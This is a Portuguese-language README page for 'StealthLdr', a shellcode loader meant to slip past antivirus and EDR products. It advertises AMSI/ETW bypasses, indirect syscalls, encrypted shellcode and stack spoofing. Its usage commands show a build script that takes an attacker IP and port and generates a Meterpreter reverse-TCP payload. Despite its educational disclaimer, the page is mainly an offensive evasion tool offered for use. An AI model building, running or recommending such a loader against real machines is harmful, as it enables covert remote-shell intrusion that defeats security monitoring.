<h1>StealthLdr - Advanced Shellcode Loader 2026</h1>

<img src='a.png' alt='img'>
        
<p><strong>Loader stealth em C++</strong> com <strong>Indirect Syscalls</strong>, AES-256 encryption, Patchless AMSI/ETW Bypass, Stack Spoofing e mais.</p>
        
<p><strong>Propósito:</strong> Estudo de técnicas modernas de evasão contra AV/EDR (Windows Defender, CrowdStrike, SentinelOne, etc.).</p>

<div class="warning">
            <strong>⚠️ AVISO LEGAL:</strong> Este projeto é exclusivamente para fins educacionais e pesquisa em ambientes de laboratório controlados. 
            Qualquer uso em sistemas sem autorização expressa é ilegal. Use com responsabilidade.
</div>

<h2>Features</h2>
<ul>
<li>Indirect Syscalls via <strong>SysWhispers4</strong> (melhor abordagem atual)</li>
<li>AES-256-CBC encryption do shellcode (com padding)</li>
<li>Patchless AMSI Bypass</li>
<li>Patchless ETW Bypass</li>
<li>Stack Spoofing básico</li>
<li>Alocação e execução via Nt* functions indiretas</li>
<li>Compilação estática com MinGW (binário menor e mais stealth)</li>
<li>Pipeline 100% automático com <code>build.sh</code></li>
</ul>

<h2>Como usar (muito simples)</h2>
<pre><code>git clone https://github.com/seuusuario/StealthLdr.git
cd StealthLdr

chmod +x build.sh
./build.sh SEU_IP 4444 meu_payload.exe</code></pre>

<p><strong>Exemplo:</strong></p>
<pre><code>./build.sh 192.168.1.100 443 beacon.exe</code></pre>

<p>O script faz tudo automaticamente:</p>
<ul>
<li>Atualiza SysWhispers4</li>
<li>Gera indirect syscalls</li>
<li>Gera shellcode (windows/x64/meterpreter/reverse_tcp)</li>
<li>Encripta com AES-256</li>
<li>Compila o loader</li>
</ul>

<h2>Requisitos (Kali Linux recomendado)</h2>
<pre><code>sudo apt update &amp;&amp; sudo apt install mingw-w64 git python3 python3-pip -y
pip3 install pycryptodome</code></pre>

<h2>Testes Recomendados</h2>
<ul>
<li>VM Windows 11 limpa com Defender ativado</li>
<li>Tire snapshot antes de testar</li>
<li>Monitore com Process Hacker, ProcMon ou EDR de avaliação</li>
</ul>

<h2>Limitações (2026)</h2>
<ul>
<li>Não é "undetectable forever". EDRs evoluem rapidamente.</li>
<li>Teste sempre em ambiente de laboratório.</li>
<li>Para mais stealth: adicione PPID Spoofing, Module Stomping ou Early-Bird APC manualmente no código.</li>
</ul>

<h2>Como colocar no GitHub</h2>
<ol>
<li>Crie um novo repositório chamado <strong>StealthLdr</strong></li>
<li>Clone localmente</li>
<li>Cole todos os arquivos do projeto</li>
<li>Adicione <code>aes.h</code> e <code>aes.c</code> do repositório <a href="https://github.com/kokke/tiny-AES-c" target="_blank">tiny-AES-c</a></li>
<li>Execute: <code>git add . &amp;&amp; git commit -m "Initial commit - StealthLdr 2026" &amp;&amp; git push</code></li>
</ol>

<p><strong>Para compilar e testar:</strong></p>
<pre><code>./build.sh SEU_IP 4444 teste.exe</code></pre>
<p>Transfira o <code>.exe</code> + <code>shellcode.enc</code> para a VM Windows e execute.</p>

<hr>
<p style="text-align: center; color: #666; margin-top: 50px;">
            Feito para estudo de <strong>Red Team</strong> e <strong>Malware Development</strong>.<br>
            Use apenas com autorização!
</p>
